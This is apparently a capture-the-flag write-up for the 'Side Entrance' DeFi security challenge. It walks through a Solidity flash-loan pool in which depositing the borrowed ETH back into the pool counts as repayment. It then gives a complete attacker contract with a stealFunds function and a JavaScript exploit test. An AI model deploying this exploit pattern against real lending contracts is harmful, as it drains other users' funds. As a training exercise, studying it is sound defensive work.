# Side-Entrance

## Introduction
The goal of this box is to siphon 1000ETHs in an existing lending pool.

## Code Breakdown
Similiar to Truster box, it only has 1 smart contract ***SideEntranceLenderPool.sol***.
Let's start by looking at the variables.
```
using Address for address payable;
mapping (address => uint256) private balances;
```
The address variable uses openzeppelin library to offer more functions.
Reference: <https://docs.openzeppelin.com/contracts/3.x/api/utils#Address>

Whereas, a simple hashmap is made for ***balances*** where each address contains *x* amount of tokens in integer format.
Reference: <https://medium.com/upstate-interactive/mappings-in-solidity-explained-in-under-two-minutes-ecba88aff96e>

The first function is an interface. It is empty and it contains an ***execute()*** function.
```
interface IFlashLoanEtherReceiver {
    function execute() external payable;
}
```

The next function is ***desposit***.
It is simple where it stores the value directly into the hashmap.
```
function deposit() external payable {
    balances[msg.sender] += msg.value;
}
```

Next, a ***withdraw()*** function is created for users to withdraw their tokens out to their wallet. Even though it does not have any reentrancy guard, it follows the best practice outlined by Solidity documentation - [Checks-Effect-Interactions Pattern](https://docs.soliditylang.org/en/v0.8.16/security-considerations.html#use-the-checks-effects-interactions-pattern).

```
function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```

Lastly, ***flashLoan(uin256 amount)*** function is created. 
As usual, it checks if the pool have sufficient ETH for borrowing.
```
uint256 balanceBefore = address(this).balance;
require(balanceBefore >= amount, "Not enough ETH in balance");
```

Next, it executes an interface function .
```
IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
```

Lastly, it checks if the loan is returned to the lending pool.
```
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
```

## Hints
First and foremost, there are two pool of funds - lending pool and individual balance pool. Both are identified based on their address. Here's the problem, the lending pool and individual balance pool have overlaps. 

Consider this scenario:
A lending pool has an address.
Since it's an address, it have an individual lending balance pool too.
Let's assign 10 ETH to the lending pool. Notice that the individual Balance pool is 0.

| Lending Pool | Lending Individual Balance | Attacker Balance Pool | Attacler Balance |
|------|------|------|------|
| 10 ETH | 0 ETH | 0 ETH | 0 ETH |

This essentially means ```address(this).balance != balances(address(this))```.
Here's the loophole, if we ***deposit*** 10 ETH to the *Lending Individual Balance*, the *Lending Pool* will still reflect 10 ETH as the ETH was not transferred away from the *Lending Pool*. However, the function will add 10 ETH into the hashmap which will increase *Lending Individual Balance* by 10 ETH. Thus, both *Lending Pool* and *Lending Individual Balance* will have 10 ETHs respectively. 

```
function deposit() external payable {
    balances[msg.sender] += msg.value;
}
```

Understanding this concept, we can also bypass the final check in the ***flashLoan*** function as ***address(this).balance*** refers to *Lending Pool*.
```
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
```

The result after flashLoan should look like this.
| Lending Pool | Lending Individual Balance | Attacker Balance Pool | Attacker Balance |
|------|------|------|------|
| 10 ETH | 10 ETH | 0 ETH | 0 ETH |

Next, we'll withdraw ETHs with the function ***withdraw()***. The function will remove all ETHs from *Lending Individual Balance* and transfer ETHs from *Lending Pool* to ***msg.sender***. ***msg.sender*** should be coming from *Attacker Balance Pool*.
Note: You may be thinking, ***Address.sol*** requires 2 parameters for the function ***sendValue*** yet I only see 1. This should clarify any doubts. ```payable(msg.sender).sendValue(amountToWithdraw);``` is the same as ```Address.sendValue(payable(msg.sender), amountToWithdraw);```
```
function withdraw() external {
    uint256 amountToWithdraw = balances[msg.sender];
    balances[msg.sender] = 0;
    payable(msg.sender).sendValue(amountToWithdraw);
}
```
Using that function should result in this.
| Lending Pool | Lending Individual Balance | Attacker Balance Pool | Attacker Balance |
|------|------|------|------|
| 0 ETH | 0 ETH | 10 ETH | 0 ETH |

Now, we'll shift the 10 ETHs from *Attacker Balance Pool* to *Attacker Balance* with a simple transaction which will yield the final result
| Lending Pool | Lending Individual Balance | Attacker Balance Pool | Attacker Balance |
|------|------|------|------|
| 0 ETH | 0 ETH | 0 ETH | 10 ETH |


## Solutions
Following the hints above, your smart contract should look similar to this.
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceAttacker
 * @author BingleBangle-BH's attacker contract
 */

 contract SideEntranceAttacker{
    using Address for address payable;
    SideEntranceLenderPool public immutable pool;

    constructor (SideEntranceLenderPool _pool){
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() public payable{
        pool.deposit{value: msg.value}();
    }

    function stealFunds() external{
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        address _owner = msg.sender;
        payable(_owner).sendValue(address(this).balance);
    }

    receive () external payable {}
 }
```

Here's the javascript
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceAttack = await ethers.getContractFactory('SideEntranceAttacker', attacker);
    this.attackpool = await SideEntranceAttack.deploy(this.pool.address);
    await this.attackpool.stealFunds();
});
```
## Recommendations
Do not use allow two pools of funds to exist in a single smart contract. Use openzeppelin libraries such as[ERC20](https://docs.openzeppelin.com/contracts/4.x/erc20) to manage the funds.